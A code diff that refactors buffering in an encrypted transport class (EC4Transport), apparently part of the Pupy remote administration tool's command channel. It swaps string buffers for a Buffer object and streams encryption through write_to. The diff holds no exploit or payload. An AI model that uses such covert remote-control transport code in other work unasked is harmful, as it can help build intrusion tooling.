@@ -5,6 +5,8 @@
 from ..base import BasePupyTransport
 from ...lib.picocmd.ecpv import ECPV
 
+from network.lib.buffer import Buffer
+
 import struct
 import time
 import random
@@ -37,7 +39,7 @@ class EC4Transport(BasePupyTransport):
 
         self.encryptor = None
         self.decryptor = None
-        self.up_buffer = ''
+        self.up_buffer = Buffer()
 
     def kex(self, data):
         if len(data) < 2:
@@ -73,11 +75,8 @@ class EC4Transport(BasePupyTransport):
 
         elif self.kex(data):
             if self.up_buffer:
-                encrypted = self.encryptor.encrypt(self.up_buffer)
+                self.up_buffer.write_to(self.downstream, modificator=self.encryptor.encrypt)
                 self.up_buffer = None
-
-                self.downstream.write(encrypted)
-                self.up_buffer = ''
 
             if len(data):
                 data.write_to(self.upstream, modificator=self.decryptor.decrypt)
@@ -86,7 +85,7 @@ class EC4Transport(BasePupyTransport):
         if self.encryptor:
             data.write_to(self.downstream, modificator=self.encryptor.encrypt)
         else:
-            self.up_buffer = self.up_buffer + data.read()
+            data.write_to(self.up_buffer)
 
 class EC4TransportServer(EC4Transport):
     pass
